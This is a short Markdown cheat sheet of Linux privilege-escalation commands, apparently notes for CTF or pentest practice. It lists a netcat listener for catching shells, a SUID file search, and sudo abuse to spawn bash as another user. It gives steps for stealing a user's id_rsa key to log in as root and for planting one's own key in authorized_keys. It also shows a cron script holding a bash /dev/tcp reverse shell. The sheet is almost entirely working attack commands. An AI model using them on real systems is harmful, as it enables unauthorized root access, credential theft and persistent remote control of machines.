# Privilege Escallation

```nc -nlvp [PORT]``` - Start netcat listener to catch shell.

```find / -perm -u=s -type f 2>/dev/null``` - Search for SUID files.

Look for sbin.

```ltrace [prog]``` - Can be used to check what the program is doing.

<details open>
<summary>Scenario 1</summary>

**Horizontal**

```sudo -l``` - Check other other user sudo permissions.

```sudo -u user2 /bin/bash``` - If, for example, user2 has sudo privileges to /bin/bash, you can spin the bash using this command.

**Vertical**

1. ```ls -la``` - Check all directories. Look for .ssh directory.
2. Navigate to .ssh folder.
3. Copy content of id_rsa file.
4. Create file id_rsa on attacker machine and paste the content.
5. ```chmod 600 id_rsa``` - give rights to file.
6. ```ssh root@[IP] -i id_rsa -p [PORT]``` - check if you can login as root.

*IF you have access to authorized_keys file there is also a way to copy into the file your own keys. This way around you can enter as root user with your own private key.

------

</details>

<details open>
<summary>Scenario 2</summary>

```cat /etc/crontab``` - To find cronjobs.

.sh file example.
```#!/bin/bash```
```bash -i >& /dev/tcp/[IP]/[PORT] 0>&1```

Remember to ```chomd +x``` !

</details>

